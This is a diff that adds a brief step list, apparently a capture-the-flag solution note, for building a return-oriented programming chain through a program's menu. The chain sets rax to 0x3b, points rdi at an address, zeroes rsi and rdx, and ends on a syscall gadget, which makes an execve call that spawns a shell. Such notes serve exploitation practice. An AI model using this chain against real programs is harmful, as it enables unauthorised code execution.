@@ -1,0 +1,25 @@
+8. show menuでアドレス確認
+0x404070
+
+5.append pop rax ret addr
+
+1.append hex value
+0x3b
+
+2.append pop rdi ret addr
+
+1.append hex value
+0x404070
+
+3.append pop rsi ret addr
+
+1.append hex value
+0
+
+4.append pop rdx ret addr
+
+1.append hex value
+0
+
+6.append "syscall; ret" addr
+
